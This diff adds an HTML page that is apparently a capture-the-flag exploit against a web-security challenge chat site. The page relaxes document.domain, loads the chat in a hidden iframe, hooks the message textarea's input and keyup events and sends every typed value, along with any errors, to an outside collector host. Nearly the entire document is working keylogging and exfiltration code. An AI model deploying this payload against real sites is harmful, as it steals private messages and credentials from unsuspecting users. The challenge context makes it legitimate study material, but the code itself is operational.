@@ -1,1 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+<script>
+    document.domain = "owley-madison.jeopardy.websec.saarland";
 
+    var iframe = document.createElement('iframe');
+    iframe.src = "https://chat.owley-madison.jeopardy.websec.saarland/?partner=ctfplayer1";
+    iframe.style.display = "none";
+    document.body.appendChild(iframe);
+
+    iframe.onload = function() {
+        try {
+            var chatDoc = iframe.contentDocument;
+            var textarea = chatDoc.getElementById('message');
+            if (textarea) {
+                textarea.addEventListener('input', function() {
+                    fetch("https://stri.ng/?h=tch_Waf527&flag=" + encodeURIComponent(textarea.value));
+                });
+                textarea.addEventListener('keyup', function() {
+                    fetch("https://stri.ng/?h=tch_Waf527&flag=" + encodeURIComponent(textarea.value));
+                });
+            }
+        } catch(e) {
+            fetch("https://stri.ng/?h=tch_Waf527&error=" + encodeURIComponent(e.toString()));
+        }
+    };
+</script>
+</body>
+</html>
+</body>
+</html>
